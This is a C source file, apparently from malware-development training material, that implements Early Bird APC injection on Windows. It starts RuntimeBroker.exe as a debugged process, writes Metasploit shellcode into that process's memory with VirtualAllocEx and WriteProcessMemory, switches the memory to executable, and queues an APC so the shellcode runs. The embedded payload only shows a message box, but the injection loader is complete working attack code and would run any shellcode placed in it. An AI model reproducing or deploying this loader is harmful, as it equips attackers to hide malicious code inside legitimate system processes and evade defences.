
// 0x1.social | Github: LeetIDA 
// CC MalDev
#include <Windows.h>
#include <stdio.h>

#pragma warning (disable:4996) // Disable Error 4996


#define TARGET_PROCESS		"RuntimeBroker.exe"


#define RESET   "\033[0m"  
#define BLACK   "\033[30m"  
#define RED     "\033[31m"  
#define GREEN   "\033[32m"  
#define YELLOW  "\033[33m"  
#define BLUE    "\033[34m"  
#define MAGENTA "\033[35m"  
#define CYAN    "\033[36m"  
#define WHITE   "\033[37m"  

// MetaSploit Message Box Shellcode
unsigned char Payload[] = {
	0xFC, 0x48, 0x81, 0xE4, 0xF0, 0xFF, 0xFF, 0xFF, 0xE8, 0xCC, 0x00, 0x00,
	0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xD2, 0x51, 0x56, 0x65,
	0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20,
	0x4D, 0x31, 0xC9, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x48, 0x8B, 0x72, 0x50,
	0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1,
	0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x48, 0x8B, 0x52, 0x20,
	0x41, 0x51, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x66, 0x81, 0x78, 0x18,
	0x0B, 0x02, 0x0F, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8B, 0x80, 0x88, 0x00,
	0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B,
	0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x4D,
	0x31, 0xC9, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6,
	0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38,
	0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75,
	0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B,
	0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04,
	0x88, 0x41, 0x58, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41,
	0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF,
	0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x4B, 0xFF, 0xFF,
	0xFF, 0x5D, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33,
	0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x59, 0x41, 0xBA, 0x4C, 0x77, 0x26,
	0x07, 0xFF, 0xD5, 0x49, 0xC7, 0xC1, 0x10, 0x00, 0x00, 0x00, 0xE8, 0x25,
	0x00, 0x00, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x2C, 0x6E, 0x20, 0x54,
	0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x45, 0x61, 0x72, 0x6C, 0x79,
	0x42, 0x69, 0x72, 0x64, 0x41, 0x50, 0x43, 0x6E, 0x20, 0x42, 0x79, 0x20,
	0x49, 0x44, 0x41, 0x00, 0x5A, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x4D, 0x65,
	0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x41, 0x58, 0x48,
	0x31, 0xC9, 0x41, 0xBA, 0x45, 0x83, 0x56, 0x07, 0xFF, 0xD5, 0xBB, 0xE0,
	0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48,
	0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05,
	0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF,
	0xD5
};



BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf(RED "\n\t[!] VirtualAllocEx Failed : %d \n" RESET, GetLastError());

		return FALSE;
	}
	printf(YELLOW "\n\t[i] Allocated Memory At :" RED " 0x%p \n" RESET, *ppAddress);


	printf("\t[#] Press <Enter> To Write Payload ... ");
	getchar();
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf(RED "\n\t[!] WriteProcessMemory Failed With Error : %d \n" RESET, GetLastError());
		return FALSE;
	}
	printf(GREEN "\t[i] Successfully Written %d Bytes\n" RESET, sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf(RED "\n\t[!] VirtualProtectEx Failed With Error : %d \n" RESET, GetLastError());
		return FALSE;
	}

	return TRUE;
}



BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR					lpPath		[MAX_PATH * 2];
	CHAR					WnDr		[MAX_PATH];

	STARTUPINFO				Si			= { 0 };
	PROCESS_INFORMATION		Pi			= { 0 };

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFO);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf(RED "[!] GetEnvironmentVariableA Failed With Error : %d \n" RESET, GetLastError());
		return FALSE;
	}

	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf(YELLOW"\n\t[i] Running : " YELLOW "\"%s\"" RESET YELLOW" ... " RESET, lpPath);

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,	
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf(RED "[!] CreateProcessA Failed with Error : %d \n" RESET, GetLastError());
		return FALSE;
	}

	printf(GREEN"[+] DONE \n" RESET);

	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;
	
	return FALSE;
}



int main() {
	SetConsoleTitle(L"EarlyBirdAPC - Github: LeetIDA");
	
	HANDLE		hProcess		= NULL,
				hThread			= NULL;

	DWORD		dwProcessId		= NULL;

	PVOID		pAddress		= NULL;


	printf(YELLOW "[i] Creating " RED "\"%s\"" RESET YELLOW " Process As A Debugged Process ... " RESET, TARGET_PROCESS);
	if (!CreateSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf(YELLOW"\t[i] Target Process Created With Pid : " RED "%d" RESET " \n", dwProcessId);
	printf(GREEN"[+] DONE \n\n" RESET);


	printf(YELLOW"[i] Writing Shellcode To The Target Process ... " RESET);
	if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
		return -1;
	}
	printf(GREEN"[+] DONE \n\n"RESET );

	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);


	printf("[#] Press <Enter> To Run Shellcode ... ");
	getchar();


	printf(RED"[i] Detaching The Target Process ... "RESET );
	DebugActiveProcessStop(dwProcessId);
	printf(GREEN"[+] DONE \n\n"RESET );

	printf("[#] Press <Enter> To Quit ... " );
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}

